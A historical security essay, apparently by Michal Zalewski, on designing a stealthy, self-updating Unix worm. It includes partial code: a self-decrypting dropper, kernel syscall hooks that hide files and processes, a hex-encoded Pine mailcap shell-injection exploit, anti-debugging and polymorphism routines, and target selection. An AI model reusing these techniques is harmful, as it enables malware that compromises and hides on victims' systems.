@@ -1,0 +1,664 @@
+
+=============================================================================
+                     "I don't think I really love you"
+=============================================================================
+
+               or writting internet worms for fun and profit
+
+                 (C) 2000 Michal Zalewski <lcamtuf@tpi.pl>
+
+
+0x00: Preface
+-----------------------------------------------------------------------------
+
+Media, kindly supported by AV "experts", drawn apocalyptical vison of
+desctruction caused by stupid M$ Outlook / VisualBasic worm, called
+"ILOVEYOU". Absurdal estimations - $10M lost for "defending the disease",
+especially when you take a look at increasing with the speed of light value of
+AV companies market shares, made many people sick. Lame VBS application that
+isn't even able to spread without luser click-me interaction, and is limited
+to one, desk-end operating system... Worm that sends itself to people in your
+addressbook, and, in it's original version, kills mp3 files on your disk [1].
+And you call it dangerous? Stop kidding.
+
+Over year ago, with couple of friends, we started writing a project, called
+'Samhain' (days ago, on packetstorm, I noticed cute program with same name -
+in fact it's not the same app, just a coincidence ;). We wanted to see if
+it's difficult to write deadly harmful Internet worm, probably much more
+dangerous than Morris's worm. Our goals:
+
+1: Portability - worm must be architecture-independent, and should work on
+   different operating systems (in fact, we focused on Unix/Unix-alikes, but
+   developed even DOS/Win code).
+
+2: Invisibility - worm must implement stealth/masquerading techniques to hide
+   itself in live system and stay undetected as long as it's possible.
+
+3: Independence - worm must be able to spread autonomically, with no user
+   interaction, using built-in exploit database.
+
+4: Learning - worm should be able to learn new exploits and techniques
+   instantly; by launching one instance of updated worm, all other worms,
+   using special communication channels (wormnet), should download updated
+   version.
+
+5: Integrity - single worms and wormnet structure should be really difficult
+   to trace and modify/intrude/kill (encryption, signing).
+
+6: Polymorphism - worm should be fully polymorphic, with no constant
+   portion of (specific) code, to avoid detection.
+
+7: Usability - worm should be able to realize choosen mission objectives -
+   eg. infect choosen system, then download instructions, and, when
+   mission is completed, simply disappear from all systems.
+
+With these seven simple principles, we started our work. This text describes
+our ideas, concepts and implementation issues. It is NOT the terrorist's
+handbook, and has not been written to help people to write such piece of code
+on their own. It's written to show that very serious potential risk, which
+we virtually can't avoid or stop, isn't only hypotetical. Code provided here
+is partial, often comes from first, instead of most recent, Samhain release
+and so on. But remember - working model has been written. And this model is
+deadly dangerous engine, which can be used to very, very bad things. Probably
+we aren't the first people who thought about it and tried to write it, that's
+what make us scared...
+
+Winter 1998, three bored people somewhere in the middle of Europe.
+Sit and relax.
+
+
+0x01: Portability
+-----------------------------------------------------------------------------
+
+This is probably the most important thing - we don't want code that can run
+only on Windows, Linux or Solaris, or - worse - can run only on x86. The
+task is quite easy to complete if you decide to spread your code in
+platform-independent form. How could it be achieved? Well, most of systems
+have C compiler :) So we might spread worm in source code, with simple
+decryptor (let's say it will be shell script).
+
+But wait, some (not much) systems don't have C compiler. What can we do? Using
+wormnet, worm during infection might ask other wormnet members for compiled
+binary for given platform. Wormnet details have been described in section 0x04.
+Anyway, binary will contain appended source code, to make futher infections
+possible within standard procedure. Infection scheme is described in section
+0x03.
+
+First version of our decryptor looked like this:
+
+const char decryptor[]="#!/bin/bash\nX=/tmp/.$RANDOM$$\n(dd if=\"$0\" of="
+"$X.f~ ibs=1 skip=\x01\x01\x01\x01 count=\x02\x02\x02\x02\x02\x02 ;dd if="
+"\"$0\" of=$X.b~ ibs=\x03\x03\x03\x03\x03 skip=1;echo \"int x;main(int c,"
+"char**v){char a[99999];int i=read(0,a,99999);for(;x<i;)a[x++]-=atoi(v[1]"
+");write(1,a,i);}\" >$X.d~;test -x /tmp/.a012382~||cc -x c $X.d~-o/\tmp/."
+"a012382~;/tmp/.a012382~ \x04\x04\x04 <$X.f~>$X.gz~;gzip -cd <$X.gz~>$X.c"
+"~;rm -f $X.f~ $X.d~;cc -O3 -x c $X.c~ -o $X~;chmod 755 /tmp/.a012382~)&>"
+"/dev/null;test -x \"$0\"&&exec $X~ \"$0\" $@\n";
+
+It used very simple (per-byte increments) "encryption" for source code with
+custom increment value (decryptor has been modified accordingly to choosen
+value - \x01, \x02, \x03 and \x04 are changed by encryptor routine). Also,
+this constant decryptor has been every time re-written using simple
+polymorphic engine (see section 0x06) to avoid constant strings. Later, we
+modified encryption routine to something little bit stronger (based on
+logistic equation number generator in chaotical window) - in fact, it
+only makes it more difficult to detect in inactive form.
+
+As you can see, this decryptor (or it's early version shown above) isn't
+highly-portable - what if we don't have bash, compiler, gzip or such
+utilities? Well, that's one of reasons we've decided to join worms in
+wormnet - if sent code won't connect back to parent and report itself,
+host is not marked as infected, and wormnet is asked for pre-compiled
+binary for given architecture (assuming we already infected this architecture
+somewhere in the world, and we had needed utilities, or we're running the
+same architecture as infected host).
+
+NOTE: For writting extremely ugly code that can run in DOS, [ba]sh, csh,
+perl etc and can be compiled with C in the same time, please refer IOCCC
+archives [2].
+
+Sebastian wrote virus code that can spread both on Windows/DOS platform with
+C compiler and Unix systems with no modifications nor any interaction. It
+does cross-partition infections and installs itself as compiler trojan
+(modifying include files to put evil instructions in every compiled
+source). It is called Califax and has been developed while writting Samhain,
+as an excercise to prove that such cross-system jumps are possible. I don't
+want to include Sebastian's sources with no permission, all I want to say
+is he did it within 415 lines of c code :) Califax hasn't been incorporated
+within Samhain project, as we don't want to infect Winbloze for ideological
+reasons :P 
+
+
+0x02: Invisibility
+-----------------------------------------------------------------------------
+
+After breaking into remote system, worm not always have root privledges, so
+first of all, we wanted to implement some techniques to hide it, make it
+look-like any other process in system, and make it hard to kill until
+there's a chance to gain higher privledges (for details on system intrusion,
+please refer section 0x03). Also, we made sure it's really hard to
+debug/trace running or even inactive worm - please refer section 0x05 for
+anti-debug code details.
+
+Our non-privledged process masquerading code consists of following parts:
+
+- masquerading: walk through /proc, choose set of common process names and
+  change your name to look just like one of them,
+
+- cyclic changes: change your name (and executable name) as well as pid
+  frequently; while doing it, always keep 'mirror' process, in case parent
+  or child get killed by walking skill-alike programs,
+
+Our goal is to make almost impossible (with common tools) to 'catch' process,
+as all /proc parameters (pid, exe name, argv[0]) are changing, and even if
+one of them is catched, we have 'mirror' project. Of course, at first we
+should avoid such attempts by camouflage.  This comment comes from libworm
+README for Unices:
+
+-- snip from README --
+
+a) Anti-scanning routines
+
+Following routines are provided to detect anti-worm stuff, like 'kill2'
+or anything smarter. You should use them before fork()ing:
+
+int bscan(int lifetime);
+
+  bscan performs 'brief scanning' using only 2 childs. Lifetime should
+  be set to something about 1000 microseconds. Return values:
+  0 - no anti-worm stuff detected, please use ascan or wscan.
+  1 - dumb anti-worm stuff detected (like 'kill2'); use kill2fork()
+  2 - smart (or brute) stuff detected, wait patiently
+
+int ascan(int childs,int lifetime);
+
+  ascan performs 'advanced scanning' using given number of childs
+  (values between 2 and 5 are suggested). It tests environment
+  using 'fake forkbomb' scenario. Results are more accurate:
+  0 - no anti-worm stuff detected (you might use wscan())
+  1 - anti-worm stuff in operation
+
+int wscan(int childs,int lifetime);
+
+  wscan acts like ascan, but uses 'walking process' scenario. It
+  seems to be buggy, accidentally returning '1' with no reason,
+  but it's also the best detection method. Return values:
+  0 - no anti-worm stuff detected
+  1 - anti-worm stuff in operation
+
+int kill2fork();
+
+  This is aletrnative version of fork(), designed to fool
+  dumb anti-worm software (use it when bscan returns 1).
+  Return value: similar as for fork().
+
+b) Masquerading routines
+
+These routines are designed to masquerade and hide current
+process:
+
+int collect_names(int how_many);
+
+  collect_names builds process names table with up to
+  'how_many' records. This table (accessible via
+  'cmdlines[]' array) contains names of processes in
+  system; Return value: number of collected items.
+
+void free_names();
+
+  this function frees space allocated by collect_names
+  when you don't need cmdlines[] anymore.
+
+int get_real_name(char* buf, int cap);
+
+  this function gets real name of executable for current
+  process to buf (where cap means 'maximal length').
+
+int set_name_and_loop_to_main(char* newname,char* newexec);
+
+  this function changes 'visible name' of process to newname
+  (you may select something from cmdlines[]), then changes
+  real executable name to 'newexec', and loops to the
+  beginning of main() function. PID will be NOT changed.
+  Set 'newexec' to NULL if you don't want to change real exec
+  name. Return value: non-zero on error.
+
+  Note: variables, stack and anything else will be reset. Please
+  use other way (pipes, files, filenames, process name) to
+  transfer data from old to new executable
+
+int zero_loop(char* a0);
+
+  this function returns '1' if this main() code is reached for
+  the first time, or '0' if set_name_and_loop_to_main() was
+  used. Pass argv[0] as parameter. It simply checks if
+  real_exec_name is present in argv[0].
+
+-- EOF --
+
+For more details and source code on architecture-independent non-root
+process hiding techniques, please refer libworm sources [3] (incomplete
+for now, but always something).
+
+This routines are weak and might be used only for short-term process
+hiding. We should as fast as possible gain root access (again, this
+aspect will be discussed later). Then, we have probably the most complex
+aspect of whole worm. Advanced process hiding is highly system-dependent,
+usually done by intercepting system calls. We have developed source for
+universal hiding modules on some systems, but it not working on every
+platform Samhain might attack. Techniques used there are based on well-known
+kernel file and process hiding modules.
+
+Our Linux 2.0/2.1 (2.2 and 2.3 kernels weren't known at the time ;) our
+module used technique later described in "abtrom" article on BUGTRAQ by
+<riq@CIUDAD.COM.AR> (Sat, 28 Aug 1999 14:40:31) to intercept syscalls [4].
+Sebastian wrote stealth file techniques (to return original contents of
+eventually infected files), while I developed process hiding and worm
+interface. Module intercepted open, lseek, llseek, mmap, fstat, stat,
+lstat, kill, ptrace, close, read, unlink, write and execve calls.
+
+For example, new llseek call look this way:
+
+int new_llseek(unsigned int fd,unsigned int offset_high,
+               unsigned int offset_low,int *result,unsigned int whence) {
+  retval=old_llseek(fd,offset_high,offset_low,result,whence);
+  if (retval<0) return retval;
+  if (!(file=current->files->fd[fd])) return retval;
+  if (S_ISREG(file->f_inode->i_mode) || S_ISLNK(file->f_inode->i_mode))
+    if (is_happy(fd) && file->f_pos < SAMLEN) file->f_pos += SAMLEN;
+  return retval;
+}
+
+In this case, we wanted to skip samhain code loader at the beginning
+of file. is_happy() function has been used to identify infected files.
+Unfortunately, it also has to check length of this loader - remember,
+it's dynamically generated. This is code from is_happy() used to determine
+this size from our decryptor routine:
+
+    // Determine where ELF starts...
+    file->f_pos=0;
+    BEGIN_KMEM
+    r=file->f_op->read(file->f_inode, file, buf,sizeof(buf));
+    END_KMEM
+    // Groah! We have to write out own atoi... Stupido ;-)
+    znaki=0;
+    while (znaki!=TH && ++v<r) if (buf[v]=='=') znaki++;
+    if (znaki==TH) {
+      while (buf[v+(++poz)]!=' ' && v+poz<r) mult=mult*10;
+      buf[v+poz]=0;
+      poz=1;
+      SAMLEN=0;
+      while (buf[v+poz]) {
+        if (buf[v+poz]-'0'>9) { znaki=1;break; } // Format error (!)
+        SAMLEN+=(buf[v+poz++]-'0')*mult;
+        mult=mult/10;
+      }
+
+Worm isn't spreading across the filesystem widely, so the problem doesn't
+affect many files - only some executables called in boot process - to
+make sure we're always resident. Process hiding is quite generic:
+
+int new_ptrace(int req,int pid,int addr,int dat) {
+  x=0;
+  buf[20]=0;
+  sprintf(b,"/proc/%d/cmdline",pid);
+  if (active)
+    BEGIN_KMEM
+    x=old_open(b,O_RDONLY,0);
+    END_KMEM
+  if (x>0) {
+    BEGIN_KMEM
+    read(x,b,1);
+    END_KMEM
+    close(x);
+    if (!b[0]) return -ESRCH;
+  }
+  return old_ptrace(req,pid,addr,dat);
+}
+
+Also, we have to hide active network connections for wormnet and sent /
+received wormnet packets to avoid detection via tcpdump, sniffit etc.
+
+That's it, nothing uncommon. Similar code has been written for some other
+platforms. See my AFHaRM or Sebastian's Adore modules for implementation
+of stealth techniques [5].
+
+
+0x03: Independence + 0x04: Learning
+-----------------------------------------------------------------------------
+
+Wormnet. The magic word. Wormnet is used to distribute upgraded Samhain
+modules (eg. new exploit plugins), and to query other worms for compiled
+binaries. Communication scheme isn't really difficult, using TCP streams
+and broadcast messages within TCP streams. Connections are persistent.
+We have four types of requests:
+
+- infection confirmation: done simply by connecting to parent worm
+  if infection succeded (no connection == failure),
+
+- update request: done by re-infecting system (in this case, already installed
+  worm verifies signature on new worm when receiving request, then swaps
+  process image by doing execve() if requesting binary has newer timestamp),
+  then inheriting wormnet connections table and sending short request to
+  connected clients, containing code timestamp. 
+
+- update confirmation: if timestamp sent on update request is newer than
+  timestamp of currently running worm, it should respond with 'confirmation',
+  then download new code via the same tcp stream; then, it should verify
+  code signature, and eventually swap it's process image with new exec, then
+  send update request to connected worms.
+
+- platform request: by sending request to every connected worm (TTL
+  mechanism is in use) describing machine type, system type and system
+  release, as well as IP and port specification; this request is sent
+  (with decreased TTL) to other connected wormnet objects, causing
+  wormnet broadcast; first worm that can provide specific binary, should
+  respond connecting to given IP and port, and worm that sent platform
+  request should accept it (once). Any futher connects() (might happen
+  till TTL expiration) should be refused. After connecting, suitable
+  binary should be sent, then passed to infection routines. Worm should
+  try first with TTL approx 5, then, on failure, might increase it by 5
+  and retry 3-5 times, we haven't idea about optimal values.
+
+Packets are "crypted" (again, nothing really strong, security by obscurity)
+with key assigned to specific connection (derived from parent IP address
+passed on infection). Type is described by one-byte field, then followed by
+size field and RAW data or null-terminated strings, eventually with
+TTL/timestamp fields (depending on type of message).
+
+Wormnet connections structure looks arbitrary and is limited only
+by max per-worm connections limit. Connections are initiated from child to
+parent worm, usually bypassing firewall and masquerading software.
+
+On infection, short 'wormnet history' list is passed to child. If parent
+has too many wormnet connections at time, and refuses new connection,
+child should connect to worm from the history list.
+       
+          3
+          |
+          |               
+  3 ----- 2 ---- 3 ----- 4 ------- 5 ------- 6
+  |     /        |                 |
+  |   /          |                 |
+  | /            |                 |		Possible wormnet structure.
+  1 ------------ 2 ----- 3         6		Numbers represent infection
+    \                  /			order. Bottom "3" couldn't
+      \              /				for some reason connect to
+        \          /                            it's parent and choosen
+          \ ---- 3 ------ 4                     "1" from 'history list'.
+                 |
+                 |
+                 |
+                 4
+
+What about exploits? Exploits are modular (plugged into worm body), and
+divided in two sections - local and remote. We wanted to be platform
+independent, so we focused on filesystem races, bugs like -xkbdir hole in
+Xwindows, and inserted just a few buffer overflows, mainly for remote
+intrusion (but we decided to incorporate some bugs like remote pine mailcap
+exploit and so on... Code was kind of shell-quoting masterpiece ;)
+
+Pine mailcap exploit (it has been already fixed after my BUGTRAQ post,
+but in late 1998 it was something new and nice):
+
+fprintf(f,"From: \"%s\" <%s@%s>\n",nam,us,buf2);
+fprintf(f,"To: <root@%s>\n",hostname);
+fprintf(f,"Subject: %s\n",top);
+fprintf(f,"MIME-Version: 1.0\n");
+fprintf(f,"Content-Type: multipart/mixed;\n");
+fprintf(f,"\tboundary=\"----=_NextPart_000_0007_01BD5F09.B6797740\"\n\n");
+fprintf(f,"------=_NextPart_000_0007_01BD5F09.B6797740\n");
+fprintf(f,"Content-Type: default/text;\n\t");
+
+fprintf(f,"\x65\x6e\x63\x6f\x64\x69\x6e\x67\x3d\x22\x5c\x5c\x5c\x22\x78\x5c"
+        "\x5c\x5c\x22\x5c\x20\x3d\x3d\x5c\x20\x5c\x5c\x5c\x22\x78\x5c\x5c"
+        "\x5c\x22\x5c\x20\x5c\x29\x5c\x20\x73\x68\x5c\x20\x2d\x63\x5c\x20"
+        "\x65\x63\x68\x6f\x5c\x24\x5c\x49\x46\x53\x5c\x5c\x5c\x66\x6f\x72"
+        "\x5c\x24\x5c\x49\x46\x53\x5c\x5c\x5c\x69\x5c\x24\x5c\x49\x46\x53"
+        "\x5c\x5c\x5c\x69\x6e\x5c\x24\x5c\x49\x46\x53\x5c\x60\x6c\x73\x5c"
+        "\x24\x49\x46\x53\x2f\x74\x6d\x70\x2f\x5c\x60\x5c\x24\x5c\x49\x46"
+        "\x53\x5c\x5c\x5c\x3b\x5c\x24\x5c\x49\x46\x53\x5c\x5c\x5c\x64\x6f"
+        "\x5c\x24\x5c\x49\x46\x53\x5c\x5c\x5c\x73\x68\x5c\x24\x5c\x49\x46"
+        "\x53\x5c\x5c\x5c\x2f\x74\x6d\x70\x2f\x5c\x5c\x5c\x24\x69\x5c\x24"
+        "\x5c\x49\x46\x53\x5c\x5c\x5c\x3b\x64\x6f\x6e\x65\x26\x3e\x2f\x74"
+        "\x6d\x70\x2f\x2e\x4b\x45\x57\x4c\x3b\x5c\x73\x68\x5c\x24\x49\x46"
+        "\x53\x5c\x5c\x5c\x2f\x74\x6d\x70\x2f\x2e\x4b\x45\x57\x4c\x22\x0A");
+
+// 'encoding="\\\"x\\\"\ ==\ \\\"x\\\"\ \)\ sh\ -c\ echo\$\IFS\\\for'
+// '\$\IFS\\\i\$\IFS\\\in\$\IFS\`ls\$IFS/tmp/\`\$\IFS\\\;\$\IFS\\\do'
+// '\$\IFS\\\sh\$\IFS\\\/tmp/\\\$i\$\IFS\\\;done&>/tmp/.KEWL;\sh\$IF'
+// 'S\\\/tmp/.KEWL"'
+
+Message body contained code to be executed (shell-script to connect,
+download and run worm, then kill any evidence). Yes, this exploit sucks
+- as it required some kind of user interaction (reading e-mail), but
+is just an example.
+
+Both remote and local exploits are sorted by effectiveness. Exploits that
+succed most of the time are tried first. Less effective ones are moved
+at the end. This list is inherited by child worms.
+
+Oh, spreading. Victims are choosen by monitoring active network connections.
+With random probability, servers are picked from this list and attacked.
+In case of success, server is added to 'visited' list - these are not
+attacked anymore. In case of failure, server is not attacked until new
+version of worm is uploaded. Of course, internal servers list is finite
+and sometimes server might be attacked again (if it's not our child and
+it isn't currently connected), but who cares, attempt will be ignored or
+upgrade procedure will happen, depending on timestamps.
+
+This code is used to qualify host (obtained from network stats):
+
+void infect_host(int addr) {
+  struct hostent* h;
+  int (*exp)(char*);
+  int i=0,n=0,max=VERY_SMALL;
+  if ((0x7F & addr)==0x7F) return;      // do not touch 127.* subnet :-)
+  h=gethostbyaddr((void*)&addr,4,AF_INET);
+  if (is_host_happy(h->h_name)) return; // In wormnet?
+  for (i=0;remote[i].present;i++) remote[i].used=0;
+  while ((max=VERY_SMALL)) {
+    n=-1;
+    for (i=0;remote[i].present;i++)
+      if (!remote[i].used && remote[i].hits>=max) { max=remote[i].hits;n=i; }
+    if (n<0) break;
+    exp=remote[n].handler;
+    remote[n].used=1;
+    current_module=n;
+    remote[n].hits+=(i=exp(h->h_name));
+    if (i>0) break;
+  }
+}
+
+
+
+0x05: Integrity
+-----------------------------------------------------------------------------
+
+The most important thing in worm's life is not to get caught. We have to be
+sure it's not easy to trace/debug us - we want to make reverse-engineering
+even harder. We don't want to expose our internal wormnet protocols,
+communication with kernel module and detection techniques used by worms to
+check for themselves, etc. Four things:
+
+- hide everything: see section 0x02.
+- hash, crypt, scramble: see sections 0x01, 0x04.
+- don't let them caught you: see section 0x02.
+- avoid debugging even if we cannot hide!
+
+We used several anti-debugger techniques, including application-dependent
+(bugs in strace on displaying some invalid parameters to syscalls, bugs in
+gdb while parsing elf headers, ommiting frame pointer, self-modyfing code
+and so on), as well as some universal debugger-killer routines called
+quite often (they aren't really time-expensive). This is one of them:
+
+void kill_debug(void) {
+  int x,n;
+  n=getppid();
+  if (!(x=fork())) {
+    x=getppid();
+    if (ptrace(PTRACE_ATTACH,x,0,0)) {
+      fprintf(stderr,
+          "\n\n\n*****************************************\n"
+                "*** I REALLY DO NOT LIKE TO BE TRACED ***\n"
+                "*****************************************\n\n\n");
+      ptrace(PTRACE_ATTACH,n,0,0);
+      kill(x,9);
+    }
+    usleep(1000);
+    ptrace(PTRACE_DETACH,x,0,0);
+    exit(0);
+  }
+  waitpid(x,&n,0);
+  return;
+}
+
+As I told before, worm modules were signed. First, using simple signatures,
+then using simple private key signing (not really difficult to crack, as
+key was relatively short, but for sure too difficult for amateurs). This
+made us sure we're going to replace our worm image with REAL worm, not
+dummy anti-worm flare.
+
+0x06: Polymorphism
+-----------------------------------------------------------------------------
+
+Polymorphic engine was quite simple - designed to make sure our decryptor
+will be different every time. As it has been written in shell language, it
+was pretty easy to add bogus commands, insert empty shell variables, add
+\ and break contents, or even replace some parts with $SHELL_VARIABLES
+declared before. Getting original content is not quite easy, but of course,
+all you have to do is to imitate shell parsing of this decryptor to get
+original contents, then you'll be able to identify at least some common
+code.
+
+Code adding \ to decryptor looks like:
+
+  while (decryptor[x]) {
+    switch (decryptor[x]) {
+      case ' ':
+        if (!rnd(2)) buf[y++]=' '; else goto difolt;
+        break;
+      case '\n':
+        if (!you_can) you_can=1;
+      default:
+      difolt:
+        if ((you_can && you_can++>1) && !rnd(10) && decryptor[x]>5 &&
+             decryptor[x]!='>' && decryptor[x]!='<' && norm>2) {
+          buf[y++]='\\';buf[y++]=10;norm=0;
+        } else {buf[y++]=decryptor[x++];norm++;}
+    }
+  }
+ 
+
+0x07: Usability
+-----------------------------------------------------------------------------
+
+It's stupid to launch worm designed eg. to steal secret information from
+specific host, because we have no idea if it will work fine, and won't be
+caught. If so, it might be debugged (it's made to be hard to debug, but,
+as every program, it's not impossible to do it, especially if you're able
+to separate worm code). Instead, we should be able to release 'harmless'
+worm, then, when we're sure it accessed interesting host and haven't been
+caught, we might send an update, which will try to reach destination worm,
+replace it with our evil code, then shut down every worm it can access via
+wormnet (by sending signed update, that will send itself to other worms,
+then shut down).
+
+Maybe it isn't the perfect solution, but in fact it's probably much safer
+than inserting even generic backdoor code by default.
+
+
+0x08: What happened then?
+-----------------------------------------------------------------------------
+
+That's it, the Samhain project, fit into approx. 40 kB of code. What
+happened to it? Nothing. It hasn't been ever released, and I never removed
+restrictions from lookup_victim() and infect_host() routines. It's still
+lying on my hard drive, getting covered with dust and oblivion, and that's
+extacly what we wanted.
+
+I stopped developing new code and testing it in January, 1999, with Samhain
+2.2 and approx. 10000 lines of code. Wojtek Bojdol has been developing his
+much more advanced wormnet and system infection/monitoring code till February
+or March, but I haven't found enough time to incorporate his sources within
+mainstream source tree. Then, we removed our repository from networked server
+we used to exchange ideas. I gradually published some bugs used in exploit
+database to BUGTRAQ, some of them (especially those not discovered by me)
+we kept for ourselves.
+
+The story ends. Till another rainy day, till another three bored hackers.
+You may be sure it will happen. The only thing you can't be sure is the
+end of next story.
+
+
+0x09: References
+-----------------------------------------------------------------------------
+
+[1] ILOVEYOU worm:
+    Dramatical headlines:
+    + http://www.cnn.com/2000/TECH/computing/05/04/iloveyou.03/   
+    Technical analysis:
+    + http://www.securityfocus.com/templates/article.html?id=30
+    Source of "ILOVEYOU" worm:
+    + http://packetstorm.securify.com/viral-db/love-letter-source.txt
+
+[2] International Obfuscated C Code Contest archives:
+    + http://www.ioccc.org
+
+[3] Libworm - unprivledged process hiding techniques:
+    + http://lcamtuf.na.export.pl/pliki/libworm.tgz
+
+[4] "yet another article about stealth modules in linux"
+    + http://www.securityfocus.com/templates/archive.pike?list=1&date=1999-08-22&msg=19990828144031.A20936@richi.bombi.net
+
+[5] Advanced File Hide and Redirect Module (in fact, old and lame ;)
+    + http://lcamtuf.na.export.pl/pliki/afharm.zip
+    Adore
+    + ???
+
+0x0f: Outro
+-----------------------------------------------------------------------------
+
+First of all, all the best goes to Maja :)
+
+Then, I'd especially like to thank people involved in the Samhain project, as
+well as other people who helped me these times to understand life, universe
+and everything:
+
+Wojciech Bojdol ...................................................... wojboj
+Sebastian Krahmer ................................................... stealth
+Krzysztof G. Baranowski ................................................. kgb
+Rafal Wojtczuk ....................................................... nergal
+Slawomir Krawczyk .................................................... nises2
+Mariusz Woloszyn ...................................................... kil3r
+Mariusz Marcinkiewicz .................................................. manY
+
+Also, I'd like to thank all the teso, HERT, lam3rz, A18 and b0f people. Thank
+you, agnes, for good will and patience. Last, but not least, best wishes to
+Solar Designer (thanks for interesting ideas and constructive critics).
+
+Any mistakes in this text are solely my fault. I'm really sorry for my
+not-good-as-I-wish english, you have to deal with it, or correct me :)
+I'd appreciate it.
+
+This text has been written in 6 hours at late Sunday night.
+
+Please send flames, ideas and 'h0w t0 kr4ck p4ssw0rdz' to <lcamtuf@tpi.pl>
+or <lcamtuf@dione.ids.pl>. This document is available at:
+
+http://lcamtuf.na.export.pl/worm.txt
+
+--
+
+October, 31 - Samhain (pronounced sow-inn) - this is time of endings and
+time of beginnings - so at Samhain, we celebrate the New Year. This is a
+quieter time, a time when the veil between worlds is thin and the spirits
+may pass more easily. At Mabon, the God Lugh died in order for us to live
+through His abundance. During the intervening time, He has gathered the
+spirits of those that have died over the year and waits for this night so
+that they may pass through the gate to the other side. This is the time to
+revere our ancestors and to say farewell to those that have passed this last
+year. It is also a time of divination. The abundance of the fields now gives
+way to the power and strength of the Horned God of the Hunt. This begins a
+time of darkness. From now until Yule, the days grow darker and colder.
+Winter storms begin to sweep down from the north.
